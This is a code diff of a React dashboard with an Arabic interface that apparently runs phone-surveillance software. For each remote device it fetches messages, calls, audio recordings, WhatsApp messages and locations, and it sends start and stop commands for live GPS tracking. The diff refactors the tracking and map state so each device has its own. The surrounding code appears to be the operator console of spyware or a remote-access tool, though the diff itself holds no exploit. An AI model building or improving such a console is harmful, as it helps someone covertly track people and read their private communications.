@@ -48,6 +48,7 @@
             const [selectedDevice, setSelectedDevice] = useState(null);
             const [ws, setWs] = useState(null);
             const [connectionStatus, setConnectionStatus] = useState("جارٍ الاتصال...");
+            const [deviceStates, setDeviceStates] = useState({}); // حالة منفصلة لكل جهاز
             const [messages, setMessages] = useState([]);
             const [calls, setCalls] = useState([]);
             const [commandResults, setCommandResults] = useState({});
@@ -56,9 +57,6 @@
             const [locations, setLocations] = useState([]);
             const [audioRecordings, setAudioRecordings] = useState([]);
             const [whatsAppMessages, setWhatsAppMessages] = useState([]);
-            const [liveLocation, setLiveLocation] = useState(null);
-            const [isTracking, setIsTracking] = useState(false);
-            const [mapType, setMapType] = useState("standard");
             const mapRef = useRef(null);
             const mapInstance = useRef(null);
             const markerRef = useRef(null);
@@ -129,27 +127,30 @@
                     .addTo(mapInstance.current)
                     .bindPopup('')
                     .openPopup();
-                updatePopupTime();
             };
 
             const updateMap = (lat, lng) => {
                 if (mapInstance.current && markerRef.current) {
                     const newLatLng = L.latLng(lat, lng);
                     markerRef.current.setLatLng(newLatLng);
-                    mapInstance.current.setView(newLatLng, 13, { animate: true });
+                    if (!mapInstance.current.getBounds().contains(newLatLng)) {
+                        mapInstance.current.setView(newLatLng, 13, { animate: true });
+                    }
                     updatePopupTime();
                 }
             };
 
             const updatePopupTime = () => {
                 if (markerRef.current) {
-                    markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(liveLocation ? liveLocation.captured_at : new Date().toISOString())}`);
+                    const currentState = deviceStates[selectedDevice?.uuid] || {};
+                    markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(currentState.liveLocation?.captured_at || new Date().toISOString())}`);
                 }
             };
 
             const centerMapOnLocation = () => {
-                if (liveLocation && mapInstance.current) {
-                    mapInstance.current.setView([liveLocation.latitude, liveLocation.longitude], 13, { animate: true });
+                const currentState = deviceStates[selectedDevice?.uuid] || {};
+                if (currentState.liveLocation && mapInstance.current) {
+                    mapInstance.current.setView([currentState.liveLocation.latitude, currentState.liveLocation.longitude], 13, { animate: true });
                     updatePopupTime();
                 }
             };
@@ -157,7 +158,7 @@
             const startTimeUpdate = () => {
                 if (timeIntervalRef.current) clearInterval(timeIntervalRef.current);
                 timeIntervalRef.current = setInterval(() => {
-                    if (isTracking && mapInstance.current && markerRef.current) {
+                    if (deviceStates[selectedDevice?.uuid]?.isTracking && mapInstance.current && markerRef.current) {
                         updatePopupTime();
                     }
                 }, 1000);
@@ -341,7 +342,13 @@
                                 const newLat = parseFloat(data.latitude);
                                 const newLng = parseFloat(data.longitude);
                                 if (newLat >= -90 && newLat <= 90 && newLng >= -180 && newLng <= 180) {
-                                    setLiveLocation({ latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() });
+                                    setDeviceStates(prev => ({
+                                        ...prev,
+                                        [selectedDeviceRef.current.uuid]: {
+                                            ...prev[selectedDeviceRef.current.uuid],
+                                            liveLocation: { latitude: newLat, longitude: newLng, captured_at: data.captured_at || new Date().toISOString() }
+                                        }
+                                    }));
                                     console.log("Updated liveLocation successfully:", newLat, newLng);
                                 } else {
                                     console.error("Invalid coordinates out of range:", newLat, newLng);
@@ -371,7 +378,7 @@
                 socket.onclose = () => {
                     console.log("WebSocket connection closed, attempting to reconnect...");
                     setConnectionStatus("تم قطع الاتصال، جارٍ إعادة المحاولة...");
-                    setLiveLocation(null);
+                    setDeviceStates(prev => ({ ...prev, [selectedDevice?.uuid]: { ...prev[selectedDevice?.uuid], liveLocation: null } }));
                     reconnectAttempts.current += 1;
                     startPolling();
                     const delay = baseReconnectDelay * Math.pow(2, reconnectAttempts.current);
@@ -380,7 +387,7 @@
                 socket.onerror = (error) => {
                     console.error("WebSocket error:", error);
                     setConnectionStatus("فشل الاتصال بالخادم");
-                    setLiveLocation(null);
+                    setDeviceStates(prev => ({ ...prev, [selectedDevice?.uuid]: { ...prev[selectedDevice?.uuid], liveLocation: null } }));
                     startPolling();
                 };
             };
@@ -412,7 +419,14 @@
                         const lastLat = selectedDevice.latitude || 0;
                         const lastLng = selectedDevice.longitude || 0;
                         initializeMap(lastLat, lastLng);
-                        setLiveLocation(lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null);
+                        setDeviceStates(prev => ({
+                            ...prev,
+                            [selectedDevice.uuid]: {
+                                ...prev[selectedDevice.uuid],
+                                liveLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: selectedDevice.lastActivity ? new Date(selectedDevice.lastActivity).toISOString() : new Date().toISOString() } : null,
+                                isTracking: prev[selectedDevice.uuid]?.isTracking || false
+                            }
+                        }));
                     }
                 } else if (!selectedDevice && mapInstance.current) {
                     mapInstance.current.remove();
@@ -421,32 +435,31 @@
             }, [selectedDevice, ws]);
 
             useEffect(() => {
-                console.log("liveLocation:", liveLocation, "isTracking:", isTracking);
-                if (liveLocation && mapInstance.current && markerRef.current && isTracking) {
-                    console.log("Updating map with live location:", liveLocation.latitude, liveLocation.longitude);
-                    updateMap(liveLocation.latitude, liveLocation.longitude);
-                    if (!mapInstance.current.getBounds().contains([liveLocation.latitude, liveLocation.longitude])) {
-                        mapInstance.current.setView([liveLocation.latitude, liveLocation.longitude], 13, { animate: true });
-                    }
-                } else if (mapInstance.current && markerRef.current && !isTracking && selectedDevice) {
+                const currentState = deviceStates[selectedDevice?.uuid] || {};
+                console.log("liveLocation:", currentState.liveLocation, "isTracking:", currentState.isTracking);
+                if (currentState.liveLocation && mapInstance.current && markerRef.current && currentState.isTracking) {
+                    console.log("Updating map with live location:", currentState.liveLocation.latitude, currentState.liveLocation.longitude);
+                    updateMap(currentState.liveLocation.latitude, currentState.liveLocation.longitude);
+                } else if (mapInstance.current && markerRef.current && selectedDevice) {
                     const lastLat = selectedDeviceRef.current?.latitude || 0;
                     const lastLng = selectedDeviceRef.current?.longitude || 0;
                     markerRef.current.setLatLng([lastLat, lastLng]);
                     mapInstance.current.setView([lastLat, lastLng], lastLat && lastLng ? 13 : 2);
                     updatePopupTime();
                 }
-            }, [liveLocation, isTracking, selectedDevice]);
+            }, [deviceStates, selectedDevice]);
 
             useEffect(() => {
-                if (isTracking) {
+                const currentState = deviceStates[selectedDevice?.uuid] || {};
+                if (currentState.isTracking) {
                     startTimeUpdate();
                 } else {
                     stopTimeUpdate();
                     if (markerRef.current) {
-                        markerRef.current.setPopupContent(`الموقع الفعلي<br>التاريخ: ${formatLocalTime(liveLocation ? liveLocation.captured_at : new Date().toISOString())}`);
+                        updatePopupTime();
                     }
                 }
-            }, [isTracking, liveLocation]);
+            }, [deviceStates, selectedDevice]);
 
             const selectDevice = (device) => {
                 setSelectedDevice(device);
@@ -458,7 +471,6 @@
                 setLocations([]);
                 setAudioRecordings([]);
                 setWhatsAppMessages([]);
-                setLiveLocation(null);
                 const lastLat = device.latitude || 0;
                 const lastLng = device.longitude || 0;
                 if (mapInstance.current) {
@@ -466,7 +478,14 @@
                     mapInstance.current = null;
                 }
                 initializeMap(lastLat, lastLng);
-                setLiveLocation(lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null);
+                setDeviceStates(prev => ({
+                    ...prev,
+                    [device.uuid]: {
+                        ...prev[device.uuid],
+                        liveLocation: lastLat && lastLng ? { latitude: lastLat, longitude: lastLng, captured_at: device.lastActivity ? new Date(device.lastActivity).toISOString() : new Date().toISOString() } : null,
+                        isTracking: false
+                    }
+                }));
                 fetchLocations(device.uuid);
                 fetchAudioRecordings(device.uuid);
                 fetchCalls(device.uuid);
@@ -485,12 +504,21 @@
             };
 
             const startLiveTracking = () => {
-                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && !isTracking) {
+                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && !deviceStates[selectedDevice.uuid]?.isTracking) {
                     ws.send(JSON.stringify({ action: "start_live_tracking", deviceId: selectedDevice.uuid, duration: 300000 }));
-                    setIsTracking(true);
+                    setDeviceStates(prev => ({
+                        ...prev,
+                        [selectedDevice.uuid]: { ...prev[selectedDevice.uuid], isTracking: true }
+                    }));
                     const lastLat = selectedDeviceRef.current?.latitude || 0;
                     const lastLng = selectedDeviceRef.current?.longitude || 0;
-                    setLiveLocation({ latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() });
+                    setDeviceStates(prev => ({
+                        ...prev,
+                        [selectedDevice.uuid]: {
+                            ...prev[selectedDevice.uuid],
+                            liveLocation: { latitude: lastLat, longitude: lastLng, captured_at: new Date().toISOString() }
+                        }
+                    }));
                     if (mapInstance.current) {
                         mapInstance.current.removeLayer(markerRef.current);
                         const customIcon = L.divIcon({
@@ -509,15 +537,16 @@
             };
 
             const stopLiveTracking = () => {
-                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && isTracking) {
+                if (ws && ws.readyState === WebSocket.OPEN && selectedDevice && deviceStates[selectedDevice.uuid]?.isTracking) {
                     ws.send(JSON.stringify({ action: "stop_live_tracking", deviceId: selectedDevice.uuid }));
-                    setIsTracking(false);
-                    setLiveLocation(null);
-                    if (mapInstance.current && markerRef.current) {
-                        const lastLat = selectedDeviceRef.current?.latitude || 0;
-                        const lastLng = selectedDeviceRef.current?.longitude || 0;
-                        markerRef.current.setLatLng([lastLat, lastLng]);
-                        mapInstance.current.setView([lastLat, lastLng], lastLat && lastLng ? 13 : 2);
+                    const currentState = deviceStates[selectedDevice.uuid] || {};
+                    setDeviceStates(prev => ({
+                        ...prev,
+                        [selectedDevice.uuid]: { ...prev[selectedDevice.uuid], isTracking: false }
+                    }));
+                    if (mapInstance.current && markerRef.current && currentState.liveLocation) {
+                        markerRef.current.setLatLng([currentState.liveLocation.latitude, currentState.liveLocation.longitude]);
+                        mapInstance.current.setView([currentState.liveLocation.latitude, currentState.liveLocation.longitude], 13, { animate: true });
                         updatePopupTime();
                     }
                     console.log("Stopped live tracking for device:", selectedDevice.uuid);
@@ -593,21 +622,21 @@
                                 <div className="flex space-x-4 mb-4">
                                     <button
                                         onClick={startLiveTracking}
-                                        disabled={isTracking}
+                                        disabled={deviceStates[selectedDevice?.uuid]?.isTracking}
                                         className="bg-green-500 text-white px-4 py-2 rounded-lg hover:bg-green-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
                                     >
                                         بدء التتبع
                                     </button>
                                     <button
                                         onClick={stopLiveTracking}
-                                        disabled={!isTracking}
+                                        disabled={!deviceStates[selectedDevice?.uuid]?.isTracking}
                                         className="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
                                     >
                                         إيقاف التتبع
                                     </button>
                                     <button
                                         onClick={() => centerMapOnLocation()}
-                                        disabled={!liveLocation}
+                                        disabled={!deviceStates[selectedDevice?.uuid]?.liveLocation}
                                         className="bg-blue-500 text-white px-4 py-2 rounded-lg hover:bg-blue-600 transition duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed"
                                     >
                                         الرجوع إلى الموقع
@@ -622,11 +651,9 @@
                                     </select>
                                 </div>
                                 <div ref={mapRef} className="w-full h-96 rounded-lg overflow-hidden" style={{ position: 'relative' }}></div>
-                                {liveLocation && (
-                                    <p className="mt-2 text-gray-600">
-                                        آخر تحديث: {formatLocalTime(liveLocation.captured_at)}
-                                    </p>
-                                )}
+                                <p className="mt-2 text-gray-600">
+                                    آخر تحديث: {formatLocalTime(deviceStates[selectedDevice?.uuid]?.liveLocation?.captured_at || new Date().toISOString())}
+                                </p>
                             </div>
 
                             <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
